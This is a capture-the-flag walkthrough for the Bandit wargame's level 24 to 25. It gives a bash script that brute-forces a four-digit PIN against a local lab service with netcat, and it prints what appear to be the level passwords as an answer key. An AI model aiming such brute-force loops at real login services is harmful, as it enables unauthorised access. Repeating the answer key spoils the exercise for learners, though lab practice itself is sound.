# Bandit Level 24 → 25

## Objective
Brute-force a PIN to retrieve the password for `bandit25`.

## Solution
Create and run a brute-force script:

1. Create directory: `mkdir /tmp/brute`
2. Change directory: `cd /tmp/brute`
3. Create script:
   ```bash
   #!/bin/bash
   passwd24=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
   for i in {0000..9999}; do
       echo "$passwd24 $i"
   done | nc localhost 30002 | grep -v Wrong | grep -v "I am the pincode checker for user bandit25"
   ```
   Or alternative:
   ```bash
   #!/bin/bash
   for i in {0000..9999}; do
       echo "passwordforbandit24 $i"
   done | nc localhost 30002 | uniq -u
   ```
4. Set permissions: `chmod +x script.sh`
5. Run: `./script.sh`

## Password for bandit25
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4